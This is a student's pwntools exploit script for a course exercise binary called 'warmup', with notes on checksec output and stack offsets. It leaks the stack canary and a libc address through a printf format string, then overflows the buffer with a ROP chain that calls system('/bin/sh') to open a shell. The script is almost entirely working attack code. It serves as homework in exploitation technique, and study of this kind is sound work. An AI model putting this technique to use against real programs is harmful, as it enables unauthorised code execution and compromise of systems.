'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP14: Warmup
File Description:  Using printf to leak canary then smash

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   74) Symbols       No    0               3               warmup

File info:
warmup: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8b72f0fc93f73d288141b26ac556a79cc1c3f495, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Canary is always 4 or 8 bytes from bp

144 - 8 = 138 bytes to canary
138/8 = 17.25 --> canary should be at %23$p, first 7 args:
    1 = print format string
    2-7, args using in 64 bit calling convention

Leak information for printf:
https://libc.nullbyte.cat/?q=printf%3Afb0&l=libc6-x32_2.27-3ubuntu1.2_i386

Did digging on stack with %7$p %8$p %9$p, showed that %9$p is a ptr!!
    Address ends with c60
    Function is 

To find what func was did
    ps -ef | grep "warmup"
    r2 -Ad PID
'''

# Import Libarries
from pwn import *

# Get offset to set libc
getToVbuff = -253      #offset at %19$p to ge to vbuff
setvbuffOffset = "0x2f8d0"
setvbuffOffsetInt = int(setvbuffOffset,16)

# variables
padding = b'a'*72 # truly 80, but the last 8 bytes are the canary, look at gets not fgets, 50h
padOverBP = b'a'*8  # overwrite base pointer
leakAddrStr = b"%19$p %23$p"

# Starting ELF
elf = ELF("./warmup")
libc = elf.libc

# start process and recieve leaked information
p = process("./warmup")
p.recv()
p.sendline(leakAddrStr)     # Send to leak address
leak = p.recvuntil(b" ")    # should be leak addr
leakInt = int(leak,16)+getToVbuff       # should be address of vbuff
canary = p.recvuntil(b"\n") # should be canary val
canaryInt = int(canary,16)
canaryInt = p64(canaryInt)

print("leak:", leak)
print("canary:", canary)

# Find offset to beginning of libc
libcStart = leakInt - libc.sym.setvbuf
print("libc Start:",hex(libcStart))

# Exploit time
popRdiRet = p64(0x0000000000001343)
binsh = p64(next(libc.search(b'/bin/sh\x00')))
retgad = p64(0x000000000000101a)
libsys = p64(libc.sym.system)
payload = padding + canaryInt + padOverBP + popRdiRet + binsh + b'aaaaaaaa' + retgad + libsys

# send and find flag
p.sendline(payload)
p.interactive()